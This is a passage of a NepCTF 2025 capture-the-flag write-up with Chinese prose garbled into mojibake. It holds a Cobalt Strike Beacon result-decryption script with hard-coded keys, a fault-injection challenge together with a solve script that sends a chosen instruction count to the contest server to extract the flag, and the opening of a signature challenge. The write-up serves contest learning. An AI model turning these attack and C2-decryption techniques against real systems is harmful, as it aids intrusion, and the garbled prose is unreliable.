class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">Beaconä»»åŠ¡æ‰§è¡Œç»“æœè§£å¯†</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> binascii<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> hexdump<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compare_mac</span>(<span class="hljs-params">mac, mac_verif</span>):<br><span class="hljs-keyword">if</span> mac == mac_verif:<br><span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(mac) != <span class="hljs-built_in">len</span>(mac_verif):<br><span class="hljs-built_in">print</span><br><span class="hljs-string">&quot;invalid MAC size&quot;</span><br><span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>result = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(mac, mac_verif):<br>result |= x ^ y<br><br><span class="hljs-keyword">return</span> result == <span class="hljs-number">0</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">encrypted_data, iv_bytes, signature, shared_key, hmac_key</span>):<br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> compare_mac(hmac.new(hmac_key, encrypted_data, digestmod=<span class="hljs-string">&quot;sha256&quot;</span>).digest()[<span class="hljs-number">0</span>:<span class="hljs-number">16</span>], signature):<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;message authentication failed&quot;</span>)<br><span class="hljs-keyword">return</span><br><br>cypher = AES.new(shared_key, AES.MODE_CBC, iv_bytes)<br>data = cypher.decrypt(encrypted_data)<br><span class="hljs-keyword">return</span> data<br><br>SHARED_KEY = binascii.unhexlify(<span class="hljs-string">&quot;a6f4a04f8a6aa5ff27a5bcdd5ef3b9a7&quot;</span>)<br>HMAC_KEY = binascii.unhexlify(<span class="hljs-string">&quot;35d34ac8778482751682514436d71e09&quot;</span>)<br><br>enc = <span class="hljs-string">&quot;00000050350ca7f4379f30cc9d6d671db886d360691c74467156e60e8356725ae2f3b880b302ea8b5556df10324e86e53ecb84046646a1758e9cb8c7fca42d660617be467627abcc3c0ce3bd3e93c02fffcb4d3a&quot;</span><br>encrypt_data=binascii.unhexlify(enc)<br><br><br>encrypt_data_length=encrypt_data[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br><br>encrypt_data_length=<span class="hljs-built_in">int</span>.from_bytes(encrypt_data_length, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)<br><br>encrypt_data_l = encrypt_data[<span class="hljs-number">4</span>:<span class="hljs-built_in">len</span>(encrypt_data)]<br><br>data1=encrypt_data_l[<span class="hljs-number">0</span>:encrypt_data_length-<span class="hljs-number">16</span>]<br>signature=encrypt_data_l[encrypt_data_length-<span class="hljs-number">16</span>:encrypt_data_length]<br>iv_bytes = <span class="hljs-built_in">bytes</span>(<span class="hljs-string">&quot;abcdefghijklmnop&quot;</span>,<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br>dec=decrypt(data1,iv_bytes,signature,SHARED_KEY,HMAC_KEY)<br><br>counter = dec[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br>counter=<span class="hljs-built_in">int</span>.from_bytes(counter, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;counter:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(counter))<br><br>dec_length = dec[<span class="hljs-number">4</span>:<span class="hljs-number">8</span>]<br>dec_length=<span class="hljs-built_in">int</span>.from_bytes(dec_length, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ä»»åŠ¡è¿”å›é•¿åº¦:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(dec_length))<br><br>de_data= dec[<span class="hljs-number">8</span>:<span class="hljs-built_in">len</span>(dec)]<br>Task_type=de_data[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br>Task_type=<span class="hljs-built_in">int</span>.from_bytes(Task_type, byteorder=<span class="hljs-string">&#x27;big&#x27;</span>, signed=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ä»»åŠ¡è¾“å‡ºç±»å‹:&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(Task_type))<br><br><span class="hljs-built_in">print</span>(de_data[<span class="hljs-number">4</span>:dec_length])<br><br><span class="hljs-built_in">print</span>(hexdump.hexdump(dec))<br></code></pre></td></tr></table></figure><p>è¾“å‡ºå¾—åˆ°flag<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250828014723056.png"></p><h2 id="easyshock"><a href="#easyshock" class="headerlink" title="easyshock"></a>easyshock</h2><p><strong>é¢˜ç›®ï¼š</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> unicorn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> unicorn.x86_const <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> capstone <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> capstone.x86_const <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> ARC4<br><br>FLAG = os.getenv(<span class="hljs-string">&#x27;FLAG&#x27;</span>,<span class="hljs-string">&#x27;test&#123;This_is_a_test_flag_connect_to_get_true_flag&#125;&#x27;</span>).encode()<br><br>CODE_COUNT = <span class="hljs-number">0</span><br>TARGET_COUNT = <span class="hljs-number">0</span><br><span class="hljs-comment"># memory address where emulation starts</span><br>CODE_ADDRESS    = <span class="hljs-number">0x110000</span><br>DATA_ADDRESS    = <span class="hljs-number">0x220000</span><br>OUTPUT_ADDRESS  = <span class="hljs-number">0x330000</span><br>KEY_ADDRESS     = <span class="hljs-number">0x440000</span><br>STACK_ADDRESS   = <span class="hljs-number">0x880000</span><br>CODE = <span class="hljs-string">b&#x27;&#x27;</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;prog&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    CODE = f.read()<br><br><br>ENTRY_POINT = CODE_ADDRESS + <span class="hljs-number">0x0</span><br>ENTRY_POINT_END = CODE_ADDRESS + <span class="hljs-number">0x296</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">flipBit</span>(<span class="hljs-params">uc:Uc,reg_name:<span class="hljs-built_in">str</span></span>):<br>    randBit = random.randint(<span class="hljs-number">0</span>,<span class="hljs-number">7</span>) <span class="hljs-comment">#not 0,63</span><br>    reg_num = <span class="hljs-built_in">eval</span>(<span class="hljs-string">&quot;UC_X86_REG_&quot;</span> + reg_name.upper())<br>    reg_value = uc.reg_read(reg_num)<br>    reg_value ^= <span class="hljs-number">1</span> &lt;&lt; randBit<br>    uc.reg_write(reg_num,reg_value)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">shock</span>(<span class="hljs-params">uc:Uc</span>):<br>    rip = uc.reg_read(UC_X86_REG_RIP)<br>    code = uc.mem_read(rip,<span class="hljs-number">16</span>)<br>    md = Cs(CS_ARCH_X86, CS_MODE_64)<br>    md.detail = <span class="hljs-literal">True</span><br>    dis = <span class="hljs-literal">None</span><br>    <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> md.disasm(code, <span class="hljs-number">0</span>):<br>        dis = d<br>        <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">for</span> reg_list <span class="hljs-keyword">in</span> dis.regs_access():<br>        <span class="hljs-keyword">for</span> reg <span class="hljs-keyword">in</span> reg_list:<br>            flipBit(uc,md.reg_name(reg))<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">hook_code</span>(<span class="hljs-params">uc:Uc, address, size, user_data</span>):<br>    <span class="hljs-keyword">global</span> CODE_COUNT<br>    <span class="hljs-keyword">if</span>(CODE_COUNT &gt;= <span class="hljs-number">199999</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [â°] Time Limit Exceed&quot;</span>)<br>        uc.emu_stop()<br>    <span class="hljs-keyword">if</span>(CODE_COUNT == TARGET_COUNT):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [âš¡] Shock!&quot;</span>)<br>        shock(uc)<br>    CODE_COUNT += <span class="hljs-number">1</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>(<span class="hljs-params">data,key,target</span>):<br>    <span class="hljs-comment"># print(&quot;   [ğŸ”’] to enc: &quot;,data.hex())</span><br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">global</span> CODE_COUNT<br>        <span class="hljs-keyword">global</span> TARGET_COUNT<br>        CODE_COUNT = <span class="hljs-number">0</span><br>        TARGET_COUNT = target<br>        <span class="hljs-comment"># Initialize emulator </span><br>        mu = Uc(UC_ARCH_X86, UC_MODE_64)<br><br>        <span class="hljs-comment"># map memory</span><br>        mu.mem_map(CODE_ADDRESS, <span class="hljs-number">1</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># Code</span><br>        mu.mem_map(DATA_ADDRESS, <span class="hljs-number">1</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># DATA</span><br>        mu.mem_map(OUTPUT_ADDRESS, <span class="hljs-number">1</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># Output</span><br>        mu.mem_map(KEY_ADDRESS, <span class="hljs-number">1</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># KEY</span><br>        mu.mem_map(STACK_ADDRESS, <span class="hljs-number">2</span> * <span class="hljs-number">0x1000</span>) <span class="hljs-comment"># STACK</span><br>        <span class="hljs-comment"># write machine code to be emulated to memory</span><br><br>        mu.mem_write(CODE_ADDRESS, CODE)<br>        mu.mem_write(KEY_ADDRESS, key)<br>        mu.mem_write(DATA_ADDRESS, data)<br><br>        <span class="hljs-comment"># initialize machine registers</span><br>        mu.reg_write(UC_X86_REG_RIP, ENTRY_POINT)<br>        mu.reg_write(UC_X86_REG_RDI, DATA_ADDRESS)<br>        mu.reg_write(UC_X86_REG_RSI, KEY_ADDRESS)<br>        mu.reg_write(UC_X86_REG_RDX, OUTPUT_ADDRESS)<br>        mu.reg_write(UC_X86_REG_RSP, STACK_ADDRESS + <span class="hljs-number">0x1000</span>)<br><br>        <span class="hljs-comment"># tracing all instructions with customized callback</span><br>        mu.hook_add(UC_HOOK_CODE, hook_code)<br><br>        <span class="hljs-comment"># emulate machine code in infinite time</span><br>        mu.emu_start(ENTRY_POINT, ENTRY_POINT_END)<br><br>        result = mu.mem_read(OUTPUT_ADDRESS, <span class="hljs-number">1024</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [â–¶ï¸] Result: &quot;</span>,result.<span class="hljs-built_in">hex</span>())<br><br>    <span class="hljs-keyword">except</span> UcError <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;   [ğŸ’¥] BOOM: %s&quot;</span> % e) <span class="hljs-comment"># https://www.bilibili.com/video/BV1ynKQzHEED</span><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">generateData</span>():<br>    text = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;text.txt&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read() + FLAG + <span class="hljs-string">b&#x27;\x0A&#x27;</span> <br>    key = os.urandom(<span class="hljs-number">16</span>)<br>    cipher = ARC4.ARC4Cipher(key).encrypt(text)<br>    <span class="hljs-keyword">return</span> cipher,key<br><br><br>cipher,key = generateData()<br>Shocktime = -<span class="hljs-number">1</span><br>Shocktime=<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;time to shock: &quot;</span>)<br><span class="hljs-keyword">try</span>:<br>    Shocktime=<span class="hljs-built_in">int</span>(Shocktime)<br><span class="hljs-keyword">except</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;wrong input!&quot;</span>)<br>run(cipher,key,Shocktime)<br></code></pre></td></tr></table></figure><p><strong>åˆ†æï¼š</strong><br>æ•…éšœæ³¨å…¥æ”»å‡»ï¼Œåˆ†æé¢˜ç›®æ‰€ç»™ä»£ç ï¼Œå¯ä»¥å‘ç°ä»£ç å®ç°äº†ä¸€ç§æ¯”ç‰¹ç¿»è½¬çš„æ¼æ´ï¼Œè®©<code>Shocktime</code>ä½ç½®çš„æ±‡ç¼–æŒ‡ä»¤è¿è¡Œè¿‡ç¨‹ä¸­æ‰€æ¶‰åŠçš„æ‰€æœ‰å¯„å­˜å™¨çš„æœ€ä½ä½çš„ä¸€ä¸ªå­—èŠ‚éšæœºç¿»è½¬ä¸€ä¸ªbitï¼Œè¿™ä¾¿æ˜¯<code>shock</code>å‡½æ•°çš„é€»è¾‘ã€‚<br>æ¥ä¸‹æ¥æˆ‘ä»¬è¦åˆ†æè·å–<code>FLAG</code>çš„æ€è·¯ï¼Œé€šè¿‡ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">text = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;text.txt&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>).read() + FLAG + <span class="hljs-string">b&#x27;\x0A&#x27;</span> <br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥çŸ¥é“æ˜æ–‡æ˜¯ç”±<code>text.txt</code>æ–‡ä»¶å’Œ<code>FLAG</code>æ‹¼æ¥æˆçš„ï¼Œä½¿ç”¨IDAé€†å‘ä¸€ä¸‹<code>prog</code>æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°è¯¥æ–‡ä»¶æ˜¯RC4çš„åŠ å¯†ç®—æ³•çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒæŒ‰ç†è¯´å°†<code>Shocktime</code>è®¾ä¸º-1å°±ä¸ä¼šæ‰§è¡Œç›¸å…³çš„<code>Shock</code>å‡½æ•°ï¼Œä¸”RC4æ˜¯å¯¹ç§°å¯†ç ï¼Œè¿ç€åŠ å¯†ä¸¤æ¬¡æŒ‰ç†è¯´ä¼šè¾“å‡ºåŸæœ¬çš„å¯†æ–‡ï¼Œç„¶è€Œå®é™…æµ‹è¯•ç»“æœä¸ºï¼š<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250807194717441.png"><br>æˆ‘ä»¬å¯ä»¥å‘ç°æ˜æ–‡åˆ°äº†<code>parameters.\n</code>ä¹‹åè¾“å‡ºå…¨æ˜¯<code>0x00</code>ï¼Œæˆ‘ä»¬å†ç»“åˆé¢˜ç›®æ‰€ç»™çš„<code>text.txt</code>æ–‡ä»¶åˆ†æï¼š<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250807195114096.png"><br>ä»è¿™ä¸ª<code>0x00</code>å¼€å§‹å°±ä¸æ­£å¸¸è¾“å‡ºäº†ï¼Œå› æ­¤å¯ä»¥åˆç†æ¨æµ‹åœ¨<code>prog</code>çš„RC4è§£å¯†é€»è¾‘ä¸­å¯¹<code>0x00</code>åšäº†ç‰¹æ®Šçš„åˆ¤æ–­ã€‚<br>ä¹‹åæˆ‘ä»¬çš„æ€è·¯å°±æ˜ç¡®äº†ï¼Œæ‰¾åˆ°å¯¹<code>0x00</code>è¿›è¡Œç‰¹æ®Šåˆ¤æ–­çš„æ±‡ç¼–æŒ‡ä»¤ï¼Œæ‰¾åˆ°è¯¥æŒ‡ä»¤æ‰§è¡Œæ—¶å¯¹åº”çš„<code>CODE_COUNT</code>ï¼Œå†å°†<code>Shocktime</code>è®¾å®šä¸ºè¯¥<code>CODE_COUNT</code>å€¼ï¼Œé€šè¿‡<code>shock</code>ä½¿è¯¥æŒ‡ä»¤å¤±æ•ˆã€‚<br>é€šè¿‡IDAå¯»æ‰¾ï¼Œå¯ä»¥å¿«é€Ÿåœ°æ‰¾åˆ°ä¸€ä¸ªååˆ†å¯ç–‘çš„æŒ‡ä»¤ï¼Œå®ƒå’Œä¸‹è¾¹çš„<code>jnz loc_169</code>ç»“åˆä½¿ç”¨å®ç°äº†å½“å‰<code>eax</code>å¯„å­˜å™¨å€¼ä¸ä¸º0æ—¶å‘ç”Ÿè·³è½¬ï¼Œå¹¶ä¸”æˆ‘ä»¬å¯ä»¥æ‰¾åˆ°å…¶çš„ç›¸å¯¹åœ°å€ã€‚<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250807201217510.png"><br>ç„¶åæˆ‘ä»¬ä¾¿èƒ½å¤Ÿé€šè¿‡åœ¨<code>hook_code</code>ä¸­æ·»åŠ ä¸‹é¢æŒ‡ä»¤æ¥è·å–å¯¹åº”çš„<code>CODE_COUNT</code>ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span>(address == CODE_ADDRESS + <span class="hljs-number">0x28D</span>):<br>        <span class="hljs-built_in">print</span>(CODE_COUNT)<br></code></pre></td></tr></table></figure><p>å…¶ä¸­<code>address</code>è¡¨ç¤ºå½“å‰æŒ‡ä»¤çš„åœ°å€ã€‚å°†<code>Shocktime</code>è®¾ä¸º-1åå¼€å§‹è¿è¡Œé¢˜ç›®æ‰€ç»™è„šæœ¬ï¼Œè¿è¡Œä¹‹åå¯ä»¥å‘ç°å¾ˆå¤šè¾“å‡ºï¼Œç”±äºæˆ‘ä»¬è¦æ‰¾åˆ°æœ€åè§£å¯†åœæ­¢çš„åœ°æ–¹ï¼Œå› æ­¤åªéœ€è¦æœ€åä¸€ä¸ª<code>CODE_COUNT</code>å³å¯ã€‚<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250807201825752.png"><br>å¾—åˆ°å¯¹åº”çš„<code>CODE_COUNT</code>å€¼ä¸º<code>49239</code>ï¼Œç„¶åè¿æ¥æœåŠ¡å™¨ï¼Œè®¾ç½®<code>Shocktime=49239</code>ï¼Œå³å¯ä»¥å‘å¯¹åº”çš„æ±‡ç¼–æŒ‡ä»¤å¤„è¿›è¡Œæ•…éšœæ³¨å…¥ï¼Œ<code>shock</code>å‡½æ•°ä¼šåœ¨è¯¥æŒ‡ä»¤æ‰§è¡Œå‰å¯¹å¯„å­˜å™¨è¿›è¡Œä¿®æ”¹ï¼Œä½¿å¯¹åº”çš„<code>eax</code>å¯„å­˜å™¨çš„å€¼ä¸å†ä¸º<code>0</code>ï¼Œä»£ç ä¼šç»§ç»­å‘ä¸‹è¾¹è¿›è¡Œè§£å¯†ï¼Œä»è€Œè¾“å‡ºflagï¼Œè„šæœ¬å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> websocket<br><span class="hljs-keyword">import</span> ssl<br><span class="hljs-keyword">import</span> re<br><br>url = <span class="hljs-string">&quot;wss://www.nepctf.com/api/traffic/BVi5vUb4Fp8j0DH8bd3vf?port=9999&quot;</span><br><br>ws = websocket.create_connection(url, sslopt=&#123;<span class="hljs-string">&quot;cert_reqs&quot;</span>: ssl.CERT_NONE&#125;)<br><br>prompt = ws.recv()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Server says:&quot;</span>, prompt.decode())<br><br>ws.send(<span class="hljs-string">&quot;49239\n&quot;</span>)<br><br>shock = ws.recv()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Shock:&quot;</span>, shock.decode())<br><br>hex_line = ws.recv().strip().decode()[<span class="hljs-number">12</span>:]<br><span class="hljs-built_in">print</span>(hex_line)<br>plain = <span class="hljs-built_in">bytes</span>.fromhex(hex_line)<br><span class="hljs-built_in">print</span>(plain)<br><span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;NepCTF&#123;&#x27;</span> <span class="hljs-keyword">in</span> plain:<br>    flag = re.search(<span class="hljs-string">rb&#x27;NepCTF\&#123;[^\&#125;]+\&#125;&#x27;</span>, plain).group()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Flag:&quot;</span>, flag.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>))<br><br>ws.close()<br></code></pre></td></tr></table></figure><p>ç»“æœå¦‚ä¸‹ï¼š<br><img src="/2025/07/25/NepCTF%202025%20Writeup/file-20250807202125783.png"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="NepSign"><a href="#NepSign" class="headerlink" title="NepSign"></a>NepSign</h2><h3 id="é¢˜ç›®"><a href="#é¢˜ç›®" class="headerlink" title="é¢˜ç›®"></a><strong>é¢˜ç›®</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmssl <span class="hljs-keyword">import</span> sm3<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> SystemRandom<br><span class="hljs-keyword">from</span> ast <span class="hljs-keyword">import</span> literal_eval<br><span class="hljs-keyword">import</span> os<br>flag = os.environ[<span class="hljs-string">&quot;FLAG&quot;</span>]<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SM3</span>(<span class="hljs-params">data</span>):<br>    d = [i <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> data]<br>    h = sm3.sm3_hash(d)<br>    <span class="hljs-keyword">return</span> h<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">SM3_n</span>(<span class="hljs-params">data, n=<span class="hljs-number">1</span>, bits=<span class="hljs-number">256</span></span>):<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(n):<br>        data = <span class="hljs-built_in">bytes</span>.fromhex(SM3(data))<br>    <span class="hljs-keyword">return</span> data.<span class="hljs-built_in">hex</span>()[:bits // <span class="hljs-number">4</span>]<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Nepsign</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.n = <span class="hljs-number">256</span><br>        <span class="hljs-variable language_">self</span>.hex_symbols = <span class="hljs-string">&#x27;0123456789abcdef&#x27;</span><br>        <span class="hljs-variable language_">self</span>.keygen()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">keygen</span>(<span class="hljs-params">self</span>):<br>        rng = SystemRandom()<br>        <span class="hljs-variable language_">self</span>.sk = [rng.randbytes(<span class="hljs-number">32</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>)]<br>        <span class="hljs-variable language_">self</span>.pk = [SM3_n(<span class="hljs-variable language_">self</span>.sk[_], <span class="hljs-number">255</span>, <span class="hljs-variable language_">self</span>.n) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">48</span>)] <br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.sk, <span class="hljs-variable language_">self</span>.pk<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">sign</span>(<span class="hljs-params">self, msg, sk=<span class="hljs-literal">None</span></span>): <br>        sk = sk <span 